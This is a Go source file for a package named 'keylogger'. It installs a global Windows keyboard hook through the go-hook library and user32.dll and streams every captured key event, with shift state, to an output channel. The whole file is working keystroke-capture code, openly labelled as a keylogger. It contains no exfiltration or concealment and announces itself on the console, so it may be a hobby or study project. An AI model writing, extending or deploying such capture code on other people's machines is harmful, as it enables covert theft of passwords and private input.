package keylogger

import (
	"fmt"
	"github.com/moutend/go-hook/pkg/keyboard"
	"github.com/moutend/go-hook/pkg/types"
	"golang.org/x/sys/windows"
	"keyboard/objects"
	"os"
	"os/signal"
)

var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState       = mod.NewProc("GetKeyState")
	procGetKeyboardLayout = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState  = mod.NewProc("GetKeyboardState")
	procToUnicodeEx       = mod.NewProc("ToUnicodeEx")

	shiftPressed bool = false
)

// getForegroundWindow gets current foreground window.
func getForegroundWindow() uintptr {
	proc := mod.NewProc("GetForegroundWindow")
	hwnd, _, _ := proc.Call()
	return hwnd
}

// KeyLogger runs the keylogger
func KeyLogger(keyOut chan objects.Letter) error {
	// Buffer size is depended on your need. The 100 is a placeholder value.
	keyboardChan := make(chan types.KeyboardEvent, 100)
	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}
	defer keyboard.Uninstall()

	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)

	fmt.Println("Start capturing keyboard input")
	for {
		select {
		case <-signalChan:
			fmt.Println("Received shutdown signal")
			return nil
		case k := <-keyboardChan:
			keyOut <- keyCheck(k)
		}
	}
}

// keyCheck checks what key was pressed on the users keyboard.
// Additionally check if SHIFT was pressed and released to update the shiftPressed variable.
func keyCheck(key types.KeyboardEvent) objects.Letter {
	if hwnd := getForegroundWindow(); hwnd != 0 {
		if key.Message == types.WM_KEYDOWN {
			if key.VKCode == types.VK_SHIFT {
				shiftPressed = true
				return createLetter(key, "SHIFT key was pressed", true)
			}
			return createLetter(key, "", false)
		} else if key.Message == types.WM_KEYUP {
			if key.VKCode == types.VK_SHIFT {
				shiftPressed = false
				return createLetter(key, "SHIFT key was released", true)
			}
		}
	}
	return objects.Letter{}
}

// createLetter return an objects.Letter object containing the current state of the keyboard.
func createLetter(key types.KeyboardEvent, additionalInfo string, isShift bool) objects.Letter {
	return objects.Letter{
		KeyboardEvent:  key,
		Capitalized:    shiftPressed,
		AdditionalInfo: additionalInfo,
		IsShift:        isShift,
	}
}
